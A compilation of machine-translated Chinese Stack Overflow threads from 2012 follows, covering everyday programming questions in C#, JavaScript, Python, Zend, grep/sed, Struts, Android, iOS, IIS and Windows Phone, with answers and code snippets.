当我运行我的程序并多次单击第二个选项卡时，它会创建标签 x 次，我不确定他们是否是一种只读取 xml 一次的方法......我尝试使用 .close 方法，但没有为我工作...任何帮助将不胜感激谢谢

```
 private void tabPage2_Enter(object sender, EventArgs e)
       {

        if (tabControl1.SelectedTab == tabPage2)
        {

            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.Load("xmldoc.xml");
            foreach (XmlNode node in xmlDoc.SelectNodes("check/tick/mark"))
            {

                Label l = new Label();
                System.Drawing.Point l1 = new System.Drawing.Point(65, 48 + a);
                l.Location = l1;
                l.Text = node.SelectSingleNode("score").InnerText;
                tabPage2.Controls.Add(l);
                a += 25;
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:59:29.970

在不同的函数中读取 xml。创建一个变量来存储您是否已经阅读了 xml。仅在尚未调用 xml 读取函数时才调用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:12:38.987

发生这种情况是因为您的代码多次读取相同的 xmldocument，因此请尝试：

```
 bool read = false;

   void ReadXmDocument()
   {
       using(XmlDocument xmlDoc = new XmlDocument())
       {
          xmlDoc.Load("xmldoc.xml");
          foreach (XmlNode node in xmlDoc.SelectNodes("check/tick/mark"))
          {
                Label l = new Label();
                System.Drawing.Point l1 = new System.Drawing.Point(65, 48 + a);
                l.Location = l1;
                l.Text = node.SelectSingleNode("score").InnerText;
                tabPage2.Controls.Add(l);
                a += 25;
          }

          read = true;
       }
   }

   private void tabPage2_Enter(object sender, EventArgs e)
   {
       if(tabControl1.SelectedTab == tabPage2 && read == false) ReadXmlDocument();
   } 
```

# javascript - 在没有锚标签的情况下使图像可点击

> ID：10246671
> 
> 赞同：6
> 
> 时间：2012-04-20T12:55:27.987
> 
> 标签：javascript, html, css

我一直在尝试使标签中的图像可点击，而不用锚标签包围它。

目的是我使用来自 yahoo 的 cfyon 脚本来制作图像的滚动字幕。选框很好，但要求包括使选框的每张图片都可点击。Onclick，将调用一个 javascript 函数。使用以下代码将这些图像提供给脚本。

```
 <script type="text/javascript">
    Cufon.now();
    var marqueecontent = '<img src="marequee/DSC_11801.jpg" width="281" height="250" alt="Monique Relander"  class="highslide" onclick="return hs.expand(this)"/><img src="marequee/DSC_10541.jpg" width="274" height="250" alt="Monique Relander" /><img src="marequee/leather-chairs1.jpg" width="221" height="250" alt="Monique Relander" /><img src="marequee/tassel-lamp.jpg" width="194" height="250" alt="Monique Relander" /><img src="marequee/angellamp.jpg" width="162" height="250" alt="Monique Relander" /><img src="marequee/daybed.jpg" width="384" height="250" alt="Monique Relander" /><img src="marequee/birdcage.jpg" width="208" height="250" alt="Monique Relander" /><img src="marequee/oakchair.jpg" width="161" height="250" alt="Monique Relander" /><img src="marequee/candelabras.jpg" width="188" height="250" alt="Monique Relander" />';
  </script> 
```

周围的单个标签不起作用。

锚标记看起来像

请帮忙！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T13:05:33.467

假设您有这样的图像

```
<img id="example" src="blah.jpg" /> 
```

您可以通过使用 css 对其进行样式设置来使其可点击：

```
#example
  {
    cursor:pointer;
  } 
```

然后使用 javascript + jquery 库

```
$("#example").click(function() {
  window.location.href = 'http://www.google.co.uk'
}); 
```

编辑：我整理了一个 jsfiddle 来展示这个：http: [//jsfiddle.net/sn6um/1/show/](http://jsfiddle.net/sn6um/1/show/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:59:59.287

您可以添加 jquery 库并执行类似的操作

```
$("img").click(function (){/*Here you put your action*/}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T13:01:13.513

你有几个选择来解决这个问题。首先是在 JavaScript 中构建图像并将它们添加到容器中。在此过程中，您可以附加点击处理程序。其次，您可以在设置选取框的 html 内容后添加处理程序。让我们看看这两种方法：

### 使用 JavaScript 构建图像

```
var myImage = new Image();
myImage.src = 'foo.png';
myImage.onclick = function(){
  alert( 'You clicked me' );
};
...
marqueeContainer.appendChild( myImage ); 
```

这需要为您拥有的每个图像执行一次。

### 设置 HTML 内容，然后添加事件处理程序

```
var myHTML = '<img src="foo.png" />';
marqueeContainer.innerHTML = myHTML;
marqueeContainer.images[0].onclick = function(){
  alert( 'You clicked me' );
}; 
```

此方法允许您使用包含所有图像及其属性的当前变量。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-03-17T16:51:01.403

```
<input type="image" src="submit.gif" alt="Submit" width="48" height="48"> 
```

[https://www.w3schools.com/tags/tryit.asp?filename=tryhtml_input_alt](https://www.w3schools.com/tags/tryit.asp?filename=tryhtml_input_alt)

不知道输入标签的“type=”选项何时扩展，但“image”、“date”、“number”是一个小小的启示

# python - 在 python 中使用 webbrowser 进行身份验证

> ID：10246673
> 
> 赞同：1
> 
> 时间：2012-04-20T12:55:39.150
> 
> 标签：python

我正在开发一个应用程序，其中将字符串作为输入，程序会自动打开浏览器并搜索字符串。我面临的问题是因为我在需要身份验证的代理后面，在搜索结果出现警报之前窗口打开询问用户名和密码......我不希望用户填写并浪费他的时间。相反，如果它存储在某个地方，我可以让我的程序自动填充此身份验证详细信息。这可能吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:51:23.137

听起来该页面使用 HTTP 身份验证。如果您不需要实际打开真正的浏览器，您可以在 python 中搜索字符串。

[requests](http://pypi.python.org/pypi/requests)使使用 HTTP 身份验证变得非常容易：

```
import requests

response = requests.get(url, auth=(username, password))
# search for your string in response.contents 
```

# zend-framework - Zend Framework - 我如何在控制器的一些动作之间共享通用代码？

> ID：10246674
> 
> 赞同：4
> 
> 时间：2012-04-20T12:55:40.970
> 
> 标签：zend-framework, zend-controller

为了让我的控制器尽可能干燥，我需要在我的控制器的 2 个动作之间共享一些公共代码（一大块代码），而不是全部，我需要在我的动作中访问这个共享代码中的变量。

例如：

```
class FirstController extends Zend_Controller_Action {

   public function firstAction() {
     //common code here: contains an array $columns 
   } 
   public function secondAction() { 
       //common code here: contains an array $columns also 

   } 

   //other actions
} 
```

那么我该如何重构它以将通用代码放在一个地方并能够访问`$columns`and`firstAction()`和`secondAction()`.

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T14:53:19.580

我不建议您使用**基本控制器**。对于这么小的任务来说，它是过度杀伤和繁重的。由于您想在一个控制器中共享公共代码，请改用动作助手和类属性`$columns`，您可以将其作为参数发送给动作助手。

在此处阅读有关[操作助手](https://framework.zend.com/manual/1.12/en/zend.controller.actionhelpers.html)的更多信息。

> Action Helpers 允许开发人员将运行时和/或按需功能注入任何扩展 Zend_Controller_Action 的 Action Controller。Action Helpers 旨在最小化扩展抽象 Action Controller 以注入通用 Action Controller 功能的必要性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:01:05.783

您可以创建新类并扩展`Zend_Controller_Action`然后扩展新创建的类而不是`Zend_Controller_Action`

**例子：**

```
class CommonactionsController extends Zend_Controller_Action {

   public function firstAction() {
     //common code here : contains an array $columns 
   } 
   public function secondAction() { 
       //common code here : contains an array $columns also 

   } 

   //other actions
} 
```

接着：

```
class FirstController extends CommonactionsController {
    // here you can use all your common actions...
} 
```

第二个控制器..

```
class SecondController extends CommonactionsController {
    // here you can use all your common actions...
} 
```

等等...

# regex - 如何使用 egrep 匹配 index.html 文件中的 2 行 html 代码

> ID：10246676
> 
> 赞同：0
> 
> 时间：2012-04-20T12:55:48.513
> 
> 标签：regex, bash, grep

我尝试从文件中提取`grep`两行`html`模式并使用`cat`. 这些行是：

```
<link type="text/css" rel="stylesheet" href="https://test.mydomain.com/store.css"> 
```

和

```
<script type="text/javascript" language="javascript" src="https://test.mydomain.com/store/gwt.nocache.js"> 
```

如果我使用`grep`命令单独使用它们。喜欢

```
if grep -F -i -n '<link type="text/css" rel="stylesheet" href="https://test.mydomain.com/store.css">' tmp.html > out.txt; then cat out.txt # IT WORKS. 
```

但我需要`grep`这两种模式。我试过了`egrep`。作为

```
egrep '(pattern1|pattern2)' 
```

作为

```
if egrep -e -i -c '(\<link type\=\"text\/css\" rel\=\"stylesheet\" href\=\"https\:\//test\.mydomain\.com\/gwtstore\/store\.css\"\>|\<link type\=\"text\/css\" rel\=\"stylesheet\" href\=\"https\:\//test\.mydomain\.com\/store\/gwt\.nocache\.js\"\>)' tmp.html > out.txt; then cat out.txt 
```

但上述语法不起作用..请协助。所有我都尝试在一个文件中搜索两组 html 代码，如果他们退出使用`sed`命令替换为另一个模式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T17:03:47.717

使用 egrep 你不需要那些括号，只需要分隔单引号内的模式的管道。

`egrep -n 'pattern1|pattern2'`

应该可以正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:03:10.147

像这样使用带有 -e 选项的 fgrep

```
fgrep -e 'firts_pattern' -e 'second_pattern' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T13:09:00.797

如果您打算使用 sed，您可能只想使用以下内容。您可能不需要两个单独的命令。使用 sed 您可以找到这两种模式是否存在，如果存在，则用一个命令替换它们。

注意：以下内容包含内联编辑。请在测试前备份您的文件

```
sed -i 's/<link type="text\/css" rel="stylesheet" href="https:\/\/test.mydomain.com\/store.css">/<REPLACE PATTERN 1>/g;s/<script type="text\/javascript" language="javascript" src="https:\/\/test.mydomain.com\/store\/gwt.nocache.js">/<REPLACE PATTERN 2>/g' /yourfile 
```

如果您是 OS X 用户，您可以尝试以下操作

注意：以下内容包含内联编辑。请在测试前备份您的文件

```
sed -i '' 's/<link type="text\/css" rel="stylesheet" href="https:\/\/test.mydomain.com\/store.css">/<REPLACE PATTERN 1>/g;s/<script type="text\/javascript" language="javascript" src="https:\/\/test.mydomain.com\/store\/gwt.nocache.js">/<REPLACE PATTERN 2>/g' /yourfile 
```

如果您打算使用它们，请记住在 REPLACE PATTERN 中转义“/”字符。

您也可能想尝试 awk。在这种情况下，它的功能很像 grep。

```
awk '/<link type="text\/css" rel="stylesheet" href="https:\/\/test.mydomain.com\/store.css">/; /<script type="text\/javascript" language="javascript" src="https:\/\/test.mydomain.com\/store\/gwt.nocache.js">/' /yourfile 
```

# maven-3 - 通过 IntelliJ 下载 Play Framework 项目中的第三方源代码

> ID：10246678
> 
> 赞同：2
> 
> 时间：2012-04-20T12:55:55.423
> 
> 标签：maven-3, playframework-2.0

请参阅附件，如何让 IntelliJ 在 Play Project 中从 Maven 下载源代码？我知道 Play 2.0 使用 sbt，但据我了解，sbt 也使用 Maven 存储库基础架构。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T17:32:23.357

我猜您需要创建带有附加源的 IntelliJ IDEA 项目？

如果是这种情况，那么您可以运行

```
idea with-sources 
```

命令使游戏控制台生成 IDEA 所需的所有文件，然后打开生成的项目。很可能需要最新的 play 2.0 主干。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-24T11:27:45.297

我正在使用 Play 2.2 有两种方法如果您在游戏控制台中，即您已经在您使用的游戏项目中运行“play”

`idea with-sources=yes`

如果您还没有启动播放控制台，那么

```
play idea sources 
```

显然，如果您使用的是 eclipse ide，您可以用 idea 代替 eclipse

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T09:24:35.300

由于玩 2.0.1 请注意它是

```
idea sources 
```

# c++ - Excel 互操作：分组列

> ID：10246682
> 
> 赞同：2
> 
> 时间：2012-04-20T12:56:01.053
> 
> 标签：c++, excel, grouping, com-interop

如何使用 Excel 互操作对列进行分组？

如果我录制宏（通常是开始的好方法），我会得到以下代码：

```
Columns("I:M").Select
Selection.Columns.Group 
```

不幸的是，由于几个问题，这不起作用，至少在 C++ 中是这样。首先，`Application.Selection`返回一个 normal `Range`，然后`Range.Columns`是另一个`Range`。`Range.Group`是这种方法：

[http://msdn.microsoft.com/en-us/library/microsoft.office.interop.excel.range.group%28v=office.11​​%29.aspx](http://msdn.microsoft.com/en-us/library/microsoft.office.interop.excel.range.group%28v=office.11%29.aspx)

此方法仅适用于数据透视表。

那么如何使用 Excel 互操作创建列组？

即使我设法创建了一个组，我该如何缩小/扩大它？我的意思是单击 + 以显示组的内容，或者相反，“单击”减号以隐藏组。如果我在录制宏时这样做，它根本不会反映在宏中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T14:12:44.937

尽管`Range.Group()`文档似乎与数据透视表有关，但如果您使用 提取列`Range.Columns`，然后将该`.Group()`方法应用于该范围，它将产生预期的效果。在 C# 中：

```
Range range = sheet.get_Range("c1","e1");
range.Columns.Group(); 
```

编辑：完整的示例，再次在 C# 中（抱歉，这是我方便的示例）：

```
Microsoft.Office.Interop.Excel.Application app = new Microsoft.Office.Interop.Excel.Application();
app.Visible = true;
app.Workbooks.Add();
Worksheet sheet = app.Workbooks[1].Sheets[1];
Range range = sheet.get_Range("c1","e1");
range.Columns.Group(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T14:06:37.227

宏记录器掩盖的一件事是需要使用 Range.EntireColumn 属性。这是一些分组、展开和折叠的代码。我通过谷歌搜索和鬼混得到了这个，但我认为它的概念是正确的。希望它很容易翻译成 C++：

```
Sub test()
Dim ws As Excel.Worksheet

Set ws = ActiveSheet
With ws
    If .Columns.OutlineLevel > 1 Then
        'clear any existing hidden grouped columns and grouping
        .Outline.ShowLevels columnlevels:=.Columns.OutlineLevel
        .Range("1:1").EntireColumn.Ungroup
    End If
    'group
    .Range("A:C").EntireColumn.Group
    'collapse
    ws.Outline.ShowLevels columnlevels:=1
    'expand
    ws.Outline.ShowLevels columnlevels:=.Columns.OutlineLevel
End With
End Sub 
```

# java - Struts 逻辑：迭代输入字段

> ID：10246684
> 
> 赞同：4
> 
> 时间：2012-04-20T12:56:02.437
> 
> 标签：java, input, struts, logic, loops

我目前有以下代码，数据显示正常。

```
<logic:iterate name="myList" id="product"  indexId="iteration" type="com.mycompany.MyBean">  
    <tr>  
        <td> <bean:write name="product" property="weight"/> </td>  
        <td> <bean:write name="product" property="sku"/> </td>  
        <td> <bean:write name="product" property="quantity"/> </td>  
    </tr>  
</logic:iterate> 
```

但现在我需要使“数量”部分可修改。用户应该能够更新该字段，按下提交，当它发送到服务器时，“myList”应该会自动更新为新的数量。

我已经尝试在这方面寻求帮助，但我一直在寻找的只是有关如何仅显示数据而不是修改数据的示例。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T13:17:31.623

所以这很棘手，因为要让它发挥作用，需要做很多事情。首先，使用 html 标签在迭代器中声明您的标签，属性 INDEXED=TRUE 和 ID 与名称不同，我还取出“indexId”属性以使用简单的“index”词作为索引：

```
<logic:iterate name="myList" id="myListI"   type="com.mycompany.MyBean">  
<tr>  
    <td> <html:input name="myListI" property="weight"  indexed="true"/> </td>  
    <td> <html:input name="myListI" property="sku"  indexed="true"/> </td>  
    <td> <html:input name="myListI" property="quantity"  indexed="true"/> </td>  
</tr> 
```

之后，为了让 struts 能够获取和设置 bean 的属性，您需要在集合对象中声明 EXTRA get 和 set 方法，使用您在 iterate 标记的 id 中编写的名称。在这种情况下，您将为 "myListI" 编写 2 个额外的 get 和 set 方法：

```
public void setMyListI(int index, myBean value){
    this.myList.add(value);
}
public myBean getMyListI(int index){
    return this.myList.get(index);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-07T15:35:01.680

我认为 Th0rndikes 的回答大多是正确的。我的实现略有不同，因此也值得尝试。

形式

```
private List<Parameter> activeParameters;

public List<Parameter> getActiveParameters() {
    return activeParameters;
}

public Parameter getParam(int index){
    return this.activeParameters.get(index);
} 
```

JSP

> ```
> <logic:iterate name="MyForm" property="activeParameters" id="param">
>   <tr>
>     <td><bean:write name="param" property="prompt"/></td>
>     <td><html:text name="param" property="value" indexed="true"/></td>
>   </tr>
> </logic:iterate> 
> ```

综上所述，我没有在 iterate 标签中使用 Type，而是使用 property 标签。在 bean 中添加一个 getter，它与 JSP（参数）中的迭代 ID 的名称相匹配，并将索引作为方法参数就可以了。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-04-29T11:53:09.153

看看这个：[http ://wiki.apache.org/struts/StrutsCatalogLazyList](http://wiki.apache.org/struts/StrutsCatalogLazyList)

> 索引属性
> 
> Struts html 标签有一个 indexed 属性，它会在提交表单时生成适当的 html 来填充 bean 的集合。**诀窍是将 id 属性命名为与索引属性****相同的名称** 。
> 
>  **比如下面的jsp...**

 **```
 <logic:iterate name="skillsForm" property="skills" id="skills">

       <html:text name="skills" property="skillId" indexed="true"/>

   </logic:iterate> 
```

> ...将生成以下 html

```
<input type="text" name="skills[0].skillId value="..."/>
<input type="text" name="skills[1].skillId value="..."/>
....
<input type="text" name="skills[n].skillId value="..."/> 
```

> 提交表单时，BeanUtils 将首先调用 getSkills(index) 方法来检索索引 bean，然后在检索到的 bean 上调用 setSkillId(..)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T13:10:16.320

理论上，[`indexed`struts html 标签的属性](http://struts.apache.org/1.2.x/userGuide/struts-html.html#text)可以用于：

> 仅在`logic:iterate`标签内部有效。如果为 true，则 html 标记的名称将呈现为“id[34].propertyName”。括号中的数字将为每次迭代生成并取自祖先逻辑：迭代标记。

但是，标签上没有对应`indexed`的属性[`html:errors`](http://struts.apache.org/1.2.x/userGuide/struts-html.html#errors)，这限制了它的用途。此外，所需的 和 属性组合`id`可能`name`会`property`相当混乱。

我发现使用 jsp scriptlet 生成包含迭代索引的属性名称更容易。以下代码要求您的表单具有字符串数组属性“数量”。

```
<% int idx=0; %>
<logic:iterate ...>
    <html:text property='<%= "quantity[" + idx + "]" %>'/>
    <html:errors property='<%= "quantity[" + idx + "]" %>'/>
    <% i++; %>
</logic:iterate> 
```**

# jquery - 如何在方向更改时自动刷新屏幕，使用媒体查询进行移动设计

> ID：10246686
> 
> 赞同：0
> 
> 时间：2012-04-20T12:56:09.597
> 
> 标签：jquery, media-queries

我建立了一个简单的静态网站，使用媒体查询来调整平板电脑和智能手机的大小。我有一个旋转的 jquery 横幅。我使用媒体查询重新调整了横幅及其图像的大小。问题是当您在智能手机/平板电脑上更改方向时，横幅尺寸不会改变，直到您进行刷新。我想知道的是如何在方向更改时自动刷新横幅，这可以通过 jquery 实现。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:04:02.937

最好使用刷新页面以外的调整大小功能

```
$(window).resize(function() {
  // add the stuff here to execute the your slider again;
}); 
```

在此处查看示例代码[http://sharetext.org/DSXR](http://sharetext.org/DSXR)

示例 V2 - [http://sharetext.org/DSYC](http://sharetext.org/DSYC)

否则你可以使用一些灵活的响应式滑块插件 [http://www.woothemes.com/flexslider/flexslider-demo/](http://www.woothemes.com/flexslider/flexslider-demo/) 你可以在这里下载 [https://github.com/woothemes/FlexSlider/downloads](https://github.com/woothemes/FlexSlider/downloads)

# iphone - 超级成为FirstResponder 不工作

> ID：10246687
> 
> 赞同：1
> 
> 时间：2012-04-20T12:56:21.373
> 
> 标签：iphone, objective-c, sdk, super

我有一个子视图，视图的一部分是透明的，所以对于用户来说，如果他们要在那个透明空间中触摸，那么任何可见的（但也在它下面）都应该是交互式的。

```
- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {
CGPoint pt = [[touches anyObject] locationInView:self];
if (CGRectContainsPoint(tableViewUse.frame, pt)){
    [self becomeFirstResponder];
}else {
    [super becomeFirstResponder];
}    
} 
```

我的子视图类中有上述代码，但问题是 [super becomeFirstResponder] 调用不起作用。现在显而易见的解决方案是在我的超级视图类中有一个 [self resignFirstResponder] 调用；然而，我计划在我的代码中使用这个类的许多实例，所以我必须找到触摸并将它与我的每个实例的框架等进行比较。所以优雅的解决方案是控制子视图中的所有内容。

感谢您的任何帮助！

Ps 刚刚注意到一个会改变我的问题的问题。如果我要让超级视图成为第一响应者，那么将在该超级视图中调用任何 touchesBegan 方法，并且必须在那里管理触摸。哎呀。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:58:41.723

试过这个

`[self.superview becomeFirstResponder];`?

# android - 在 Gridview 中使用 Frame/RelativeLayout 时出错

> ID：10246690
> 
> 赞同：1
> 
> 时间：2012-04-20T12:56:31.450
> 
> 标签：android

我正在创建一个自定义 Gridview，每个单元格都由包含的布局表示

*   1) 自定义 RatingBar
*   2) 图像视图

我在 Adaptor 的 getView() 中给它们充气。

它工作正常是所说的布局是线性的。但是如果我用框架/相对布局替换它，它会在 Logcat 中崩溃。

```
04-20 18:19:16.921: E/AndroidRuntime(24111): FATAL EXCEPTION: main
04-20 18:19:16.921: E/AndroidRuntime(24111): java.lang.ClassCastException: android.widget.AbsListView$LayoutParams
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.widget.RelativeLayout$DependencyGraph.findRoots(RelativeLayout.java:1303)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.widget.RelativeLayout$DependencyGraph.getSortedViews(RelativeLayout.java:1250)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.widget.RelativeLayout.sortChildren(RelativeLayout.java:281)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.widget.RelativeLayout.onMeasure(RelativeLayout.java:303)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.view.View.measure(View.java:8313)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.widget.GridView.onMeasure(GridView.java:950)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.view.View.measure(View.java:8313)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.view.View.measure(View.java:8313)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.view.View.measure(View.java:8313)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.view.ViewRoot.performTraversals(ViewRoot.java:839)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.view.ViewRoot.handleMessage(ViewRoot.java:1859)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.os.Handler.dispatchMessage(Handler.java:99)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.os.Looper.loop(Looper.java:123)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at android.app.ActivityThread.main(ActivityThread.java:3683)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at java.lang.reflect.Method.invokeNative(Native Method)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at java.lang.reflect.Method.invoke(Method.java:507)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
04-20 18:19:16.921: E/AndroidRuntime(24111):    at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:00:32.353

所有布局类（LinearLayout、RelativeLayout 等）都扩展 ViewGroup。

ViewGroup 类有两个静态内部类：LayoutParams 和 MarginLayoutParams。而 ViewGroup.MarginLayoutParams 实际上扩展了 ViewGroup.LayoutParams。

有时布局类需要额外的布局信息才能与子视图相关联。为此，他们定义了内部静态 LayoutParams 类。例如，LinearLayout 有：

```
public class LinearLayout extends ViewGroup {
   ...
   public static class LayoutParams extends ViewGroup.MarginLayoutParams {  
   ...
   }
} 
```

相对布局也一样：

```
public class RelativeLayout extends ViewGroup {
   ...
   public static class LayoutParams extends ViewGroup.MarginLayoutParams {  
   ...
   }
} 
```

但是 LinearLayout.LayoutParams 和 RelativeLayout.LayoutParams 是完全不同的独立类。它们存储有关子视图的不同附加信息。

例如，LinearLayout.LayoutParams 可以将权重值与每个视图关联，而 RelativeLayout.LayoutParams 不能。与 RelativeLayout.LayoutParams 相同：它可以将上面、下面、alightWithParent 等值与每个视图相关联。而 LinearLayout.LayoutParams 根本没有这些能力。

所以一般来说，你必须使用封闭布局中的 LayoutParams 来使你的视图正确定位和渲染。但请注意，所有 LayoutParams 都有相同的父类 ViewGroup.LayoutParams。如果您只使用在该类中定义的功能（例如在您的情况下为 WRAP_CONTENT 和 FILL_PARENT），您可以获得工作代码，即使错误的 LayoutParams 类用于指定布局参数。

# asp.net-mvc-3 - 身份验证问题 仅在 IIS7.5 上

> ID：10246694
> 
> 赞同：1
> 
> 时间：2012-04-20T12:56:52.623
> 
> 标签：asp.net-mvc-3, forms-authentication, iis-7.5

我有一个我一直在开发的 MVC 3 应用程序，它使用 Forms 身份验证。在我的 web.config 文件中，我拥有的唯一身份验证代码是：

```
<authentication mode="Forms">
  <forms loginUrl="~/Account/LogOn" timeout="2880" />
</authentication> 
```

`[Authorize]`然后，我在需要限制访问的每个单独的控制器上使用标签。

我在我的开发机器（Windows 7）、一个在线演示服务器（带有 IIS6.5 的 Windows 2003）和一个本地生产服务器（带有 IIS7.5 的 Windows 2008 Web Edition R2）上运行该系统。

当我在 Win2008 服务器上访问系统时，我按预期重定向到登录页面，但是没有加载任何 CSS 样式表，并且所有图像都丢失（全部位于 Content 文件夹中）。这只发生在 Win2008 服务器、我的本地开发机器和 Win2003 机器上，CSS 和图像加载得很好。

Content 文件夹没有任何限制，实际上它甚至包含自己的 web.config，明确允许未经身份验证的用户访问。我还尝试在主 web.config 中添加一行，允许完全访问内容。

如果我在 Content 文件夹中放置一个 .htm 文件，我可以在浏览器中访问它。但是，如果我尝试访问图像或 .css 文件，我会立即被重定向到登录页面！

我对可能导致这种情况的原因感到困惑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T14:59:00.713

正如 Wim 所提到的，重复的线程有答案（尽管在我的案例中对已接受答案的评论）。

该问题是由 IIS 管理器中的身份验证设置引起的。

选择您的站点，然后选择身份验证。确保同时启用匿名身份验证和表单身份验证。

就我而言，我还必须更改匿名用户 - 为此，请右键单击匿名身份验证并选择编辑。将其更改为应用程序池标识。

在此之后，图像和样式完美加载！

# windows-phone-7 - 超链接按钮中的内容不显示

> ID：10246697
> 
> 赞同：1
> 
> 时间：2012-04-20T12:57:11.040
> 
> 标签：windows-phone-7, xaml

我目前正在尝试向我的超链接按钮添加一些样式，但无法使其正常工作。

经过一番搜索，我找到了这个教程，但即使复制了整个代码（并且只更改了图片），它对我也不起作用。我的 SDK 目标是 7.5。

这是我的代码：

```
 <ScrollViewer>
        <StackPanel x:Name="TitlePanel" Grid.Row="0" Margin="12,17,0,28">
            <HyperlinkButton NavigateUri="/Views/PanoramaPage.xaml" Content="Panorama" Foreground="{StaticResource PhoneAccentBrush}"/>
            <HyperlinkButton NavigateUri="/Views/PanoramaPage.xaml" Content="Pivot" Foreground="{StaticResource PhoneAccentBrush}"/>

            <HyperlinkButton Name="hyperlinkButton1" NavigateUri="/Views/PanoramaPage.xaml" >
                <Border BorderBrush="White" BorderThickness="5" Padding="10">
                    <StackPanel Orientation="Horizontal">
                        <Image Width="60" Source="/Presentation;component/Images/refresh.png" />
                        <TextBlock VerticalAlignment="Center" Text="Go to View.xaml"/>
                    </StackPanel>
                </Border>
            </HyperlinkButton>

        </StackPanel>
    </ScrollViewer> 
```

教程网址： [http ://www.imaginativeuniversal.com/blog/post/2010/07/05/Navigating-around-windows-phone-7.aspx](http://www.imaginativeuniversal.com/blog/post/2010/07/05/Navigating-around-windows-phone-7.aspx)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T13:14:27.457

HyperlinkBut​​ton 的默认控件模板是 TextBlock，因此它只能处理文本！

解决此问题的一种方法是更改​​控件模板，如下所示：

```
<HyperlinkButton Name="hyperlinkButton1" NavigateUri="/Views/PanoramaPage.xaml">
    <HyperlinkButton.Template>
        <ControlTemplate TargetType="HyperlinkButton">
            <Border BorderBrush="White" BorderThickness="5" Padding="10">
                <StackPanel Orientation="Horizontal">
                    <Image Width="60" Source="/Presentation;component/Images/refresh.png" />
                    <TextBlock VerticalAlignment="Center" Text="Go to View.xaml"/>
                </StackPanel>
            </Border>
        </ControlTemplate>
    </HyperlinkButton.Template>
</HyperlinkButton> 
```

# api - 如何使用经销商俱乐部提供的搜索域 Http API

> ID：10246704
> 
> 赞同：0
> 
> 时间：2012-04-20T12:57:33.943
> 
> 标签：api, http, search, dns

我已经提供了用于域名搜索的经销商俱乐部 http api。网址如下：

[https://test.httpapi.com/api/domains/available.json?auth-userid=0&auth-password=password&domain-name=domain1&domain-name=domain2&tlds=com&tlds=net](https://test.httpapi.com/api/domains/available.json?auth-userid=0&auth-password=password&domain-name=domain1&domain-name=domain2&tlds=com&tlds=net)

现在我并不了解如何使用它以及应该用什么来代替 test.httpapi.com

还有当我使用我的域名时说

对于 www.x.in

我使用 x.httpapi.com 和验证参数，这使得 url

[https://x.httpapi.com/api/domains/available.json?auth-userid=xxxx&auth-password=xxxxx&domain-name=test.com&domain-name=test2.com&tlds=com&tlds=net](https://x.httpapi.com/api/domains/available.json?auth-userid=xxxx&auth-password=xxxxx&domain-name=test.com&domain-name=test2.com&tlds=com&tlds=net)

它显示 ssl 错误以及何时

www.x.httpapi.com/api/domains/available.json?auth-userid=xxxx&auth-password=xxxxx&domain-name=test.com&domain-name=test2.com&tlds=com&tlds=net

它显示 ngix 错误

请建议

* * *

## 回答 #1

> 赞同：8
> 
